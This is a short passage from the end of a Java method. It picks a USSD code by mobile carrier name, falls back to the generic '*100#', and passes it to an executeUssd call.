        codes.put("generic","*100#");

        if (carrier == null) carrier = "generic";
        String code = codes.getOrDefault(carrier.toLowerCase(), "*100#");
        return executeUssd(code);
    }
}
